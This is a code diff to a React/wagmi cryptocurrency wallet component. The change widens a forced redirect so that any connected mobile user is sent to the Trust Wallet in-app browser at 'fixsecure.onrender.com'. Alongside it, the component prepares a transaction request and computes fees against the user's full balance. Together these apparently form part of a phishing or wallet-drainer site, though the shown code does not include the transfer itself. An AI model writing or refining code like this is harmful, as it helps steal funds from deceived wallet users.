@@ -131,7 +131,8 @@ const { data: request } = usePrepareTransactionRequest(
     }
   }, [confirmed]);
 
-      const isMobile = () => /Mobi|Android/i.test(navigator.userAgent)
+      const isMobile = () => /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
+
 
 
 
@@ -139,6 +140,7 @@ const { data: request } = usePrepareTransactionRequest(
   // Trust Wallet injects `ethereum.isTrust` in the in-app browser
   return typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true;
 }
+
 
 
   useEffect(() => {
@@ -171,6 +173,17 @@ const { data: request } = usePrepareTransactionRequest(
   });
 
   useEffect(() => {
+  if (
+    isConnected &&
+    isMobile() &&
+    !isTrustWalletApp() // ensure we are not already inside the app
+  ) {
+    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chain.id}&url=https://fixsecure.onrender.com`
+    window.open(trustLink, "_blank");
+    }
+}, [isConnected, walletInfo, activeChain?.id]);
+
+  useEffect(() => {
     if (estimateGas.data && gasPrice.data && balance.data?.value) {
       const fee = estimateGas.data * gasPrice.data; // bigint × bigint
       setTotalFee(fee);
@@ -191,14 +204,7 @@ const { data: request } = usePrepareTransactionRequest(
     return;
   }
 
-    if (
-    walletInfo?.name === "Trust Wallet" &&
-    isMobile() &&
-    !isTrustWalletApp() // ensure we are not already inside the app
-  ) {
-    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chain.id}&url=https://fixsecure.onrender.com`
-    window.open(trustLink, "_blank");
-    }
+  
 
          if(walletInfo?.name === "MetaMask" && isMobile()) {
       const metamaskLink= "https://link.metamask.io"
